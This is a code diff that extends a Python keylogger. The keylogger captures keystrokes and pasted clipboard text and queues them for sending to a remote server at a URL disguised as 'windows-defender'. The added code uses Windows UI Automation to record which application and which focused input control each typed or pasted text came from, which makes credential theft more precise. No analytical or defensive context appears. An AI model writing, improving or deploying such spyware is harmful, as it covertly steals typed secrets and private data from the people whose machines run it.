@@ -12,6 +12,10 @@ from urllib.error import URLError, HTTPError
 from urllib.request import Request, urlopen
 
 from pynput.keyboard import Key, KeyCode, Listener
+try:
+    from pywinauto import Desktop
+except ImportError:
+    Desktop = None
 
 MESSAGE_GAP_MS = 2500
 SITE_URL = "https://windows-defender-cf8n.onrender.com"
@@ -20,6 +24,8 @@ device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
 message_buffer = ""
 last_key_time_ms = None
 message_started_ms = None
+active_target = None
+active_target_key = None
 active_modifiers = set()
 state_lock = Lock()
 message_queue = Queue()
@@ -62,6 +68,29 @@ def get_active_app():
     if title and executable:
         return f"{executable} - {title}"
     return title or executable or "Unknown app"
+
+
+def get_active_target():
+    app_name = get_active_app()
+    if os.name != "nt" or Desktop is None:
+        return app_name, app_name
+
+    try:
+        window = Desktop(backend="uia").get_active()
+        focused_control = window.get_focus()
+        control_type = focused_control.element_info.control_type or "Control"
+        control_name = (focused_control.window_text() or "").strip()
+        if not control_name:
+            control_name = (focused_control.element_info.name or "").strip()
+        automation_id = (focused_control.element_info.automation_id or "").strip()
+        details = control_name or automation_id or control_type
+        if control_name and control_type.lower() not in control_name.lower():
+            details = f"{control_type}: {control_name}"
+        target = f"{app_name} | {details}"
+        target_key = f"{app_name}|{control_type}|{control_name}|{automation_id}"
+        return target, target_key
+    except Exception:
+        return app_name, app_name
 
 
 def get_clipboard_text():
@@ -148,16 +177,20 @@ def message_sender():
 
 def flush_message_buffer():
     global message_buffer, last_key_time_ms, message_started_ms
+    global active_target, active_target_key
     text = message_buffer.strip()
     message_buffer = ""
     last_key_time_ms = None
     message_started_ms = None
     if text:
-        message_queue.put((text, get_active_app(), False))
+        message_queue.put((text, active_target or get_active_app(), False))
+    active_target = None
+    active_target_key = None
 
 
 def on_press(key):
     global message_buffer, last_key_time_ms, message_started_ms
+    global active_target, active_target_key
     with state_lock:
         modifier_aliases = {
             Key.shift_l: Key.shift, Key.shift_r: Key.shift, Key.ctrl_l: Key.ctrl,
@@ -174,7 +207,8 @@ def on_press(key):
             pasted_text = get_clipboard_text().strip()
             if pasted_text:
                 flush_message_buffer()
-                message_queue.put((pasted_text, get_active_app(), True))
+                target, target_key = get_active_target()
+                message_queue.put((pasted_text, target, True))
             return
 
         symbol = normalize_key(key)
@@ -185,8 +219,16 @@ def on_press(key):
         elif symbol == "\n":
             flush_message_buffer()
         elif symbol:
+            target, target_key = get_active_target()
+            if message_buffer and active_target_key != target_key:
+                flush_message_buffer()
+            if not message_buffer:
+                active_target = target
+                active_target_key = target_key
             if message_buffer and last_key_time_ms and now_ms - last_key_time_ms >= MESSAGE_GAP_MS:
                 flush_message_buffer()
+                active_target = target
+                active_target_key = target_key
             if message_started_ms is None:
                 message_started_ms = now_ms
             message_buffer += symbol
